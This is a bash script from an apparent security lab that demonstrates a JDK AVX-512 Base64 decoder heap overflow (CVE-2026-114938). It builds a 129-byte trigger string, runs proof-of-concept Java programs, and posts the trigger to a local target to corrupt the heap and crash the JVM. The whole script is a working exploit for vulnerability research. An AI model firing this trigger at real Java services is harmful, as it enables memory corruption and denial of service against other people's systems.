#!/usr/bin/env bash
# ATTACKER pane (terminal 2).
# Sends the 129-byte trigger, measures the out-of-bounds window and brings the target down.
#
# Lab author: eduxcode (github.com/eduxcode)
# Primitive: CVE-2026-114938
set -uo pipefail
LAB="$(cd "$(dirname "$0")/.." && pwd)"
cd "$LAB"
source "$LAB/demo/env.sh"

PORT="8080"
BASE="http://127.0.0.1:${PORT}"
JDK="${JDK:-eclipse-temurin:17.0.6_10-jdk}"
TMP="$(mktemp)"
trap 'rm -f "$TMP"' EXIT

printf '\033[1;32m'
cat <<'EOF'
+--------------------------------------------------------------+
|  ATTACKER  -  129-byte Base64 trigger                        |
|  lab: eduxcode (github.com/eduxcode)                         |
|  primitive: CVE-2026-114938                                  |
+--------------------------------------------------------------+
EOF
printf '\033[0m\n'

echo "waiting for the target at $BASE ..."
for _ in $(seq 1 120); do
  curl -sf -m 2 "$BASE/health" >/dev/null 2>&1 && break
  sleep 1
done
if ! curl -sf -m 2 "$BASE/health" >/dev/null 2>&1; then
  echo "target unavailable; start ./demo/target.sh first"; exit 1
fi
echo "target: $(curl -s "$BASE/health")"
echo

echo "-- 1. CPU gate -----------------------------------------------------------"
if [ "$SDE_MODE" = 1 ]; then
  echo "   AVX-512 VBMI: EMULATED via Intel SDE"
  echo "   (the CPUID seen by the JVM reports avx512f/bw/vbmi; the hardware does not have them)"
else
  FLAGS="$(grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n')"
  MISS=""
  for f in avx512f avx512bw avx512vbmi bmi2; do
    grep -qx "$f" <<<"$FLAGS" || MISS="$MISS $f"
  done
  if [ -z "$MISS" ]; then
    echo "   AVX-512 VBMI: present (native)"
  else
    echo "   AVX-512 VBMI: missing ->$MISS"
    echo "   without SDE the intrinsic does not run; expect 'no corruption'"
  fi
fi
echo

VALID="$(python3 -c 'print("A"*64)')"
TRIG="$(python3 -c 'import sys;sys.stdout.write("A"*128+"=")')"

echo "-- 2. payload ------------------------------------------------------------"
echo "   baseline: 64x'A'          -> ${#VALID} bytes (valid, decodes 48)"
echo "   trigger : 128x'A' + '='   -> ${#TRIG} bytes"
echo "   why 129: the AVX-512 stub requires length > 128; the 1-byte tail"
echo "   after two 64-byte blocks makes output_size = -1 and the mask 0xffff..."
echo

send() { # label payload endpoint
  local label="$1" payload="$2" ep="$3" code body t0 t1 ms
  t0=$(date +%s%N)
  code=$(curl -s -o "$TMP" -w '%{http_code}' -m 30 -X POST --data-binary "$payload" "$BASE/$ep")
  t1=$(date +%s%N)
  ms=$(( (t1 - t0) / 1000000 ))
  body="$(head -c 220 "$TMP")"
  printf '   %-12s %-14s http=%-3s %6dms  %s\n' "$label" "/$ep" "$code" "$ms" "$body"
}

echo "-- 3. baseline -----------------------------------------------------------"
send "baseline" "$VALID" "decode-safe"
echo

echo "-- 4. mechanism: the store mask (runs on any CPU) ------------------------"
if [ "$SDE_MODE" = 1 ]; then
  "$SDE" -icx -- "$J4S_JAVA" "${J4S_FLAGS[@]}" -cp "$J4S_BUILD" MaskUnderflow 2>&1 | sed -n '1,10p'
else
  docker run --rm -v "$LAB/poc:/poc:ro" -w /poc "$JDK" \
    sh -c 'javac -d /tmp/o MaskUnderflow.java && java -cp /tmp/o MaskUnderflow' 2>&1 | sed -n '1,10p'
fi
echo

echo "-- 5. oracle: measures the exact write window ----------------------------"
if [ "$SDE_MODE" = 1 ]; then
  J4S_SDE=1 "$SDE" -icx -- "$J4S_JAVA" "${J4S_FLAGS[@]}" \
    -cp "$J4S_BUILD" Oracle --warmup 5000 2>&1
else
  docker run --rm -v "$LAB/poc:/poc:ro" -w /poc "$JDK" \
    sh -c 'javac -d /tmp/o Oracle.java && java -cp /tmp/o Oracle --warmup 200000' 2>&1
fi
RC=$?
echo

echo "-- 6. firing at the target: /decode-exact (exact buffer + victim) --------"
echo "   the JDK rejects the input, but the 64-byte store has already happened"
send "TRIGGER" "$TRIG" "decode-exact"
echo

sleep 1
if curl -sf -m 3 "$BASE/health" >/dev/null 2>&1; then
  echo "   target still responding: $(curl -s "$BASE/health")"
else
  echo "   TARGET NOT RESPONDING -> the JVM crashed (see the target pane)"
fi
echo

echo "-- 7. verdict ------------------------------------------------------------"
if [ $RC -eq 0 ]; then
  echo "   HEAP CORRUPTION REPRODUCED: 62 bytes past the 98-byte buffer."
  echo "   The neighboring object header was overwritten (victim_len != 256)."
  echo "   Demonstrated impact: memory corruption + JVM crash."
  echo "   RCE would need a per-application chain, which is not public."
else
  echo "   no corruption on this host (rc=$RC)."
  echo "   use ./demo/setup-sde.sh to emulate AVX-512 locally."
fi
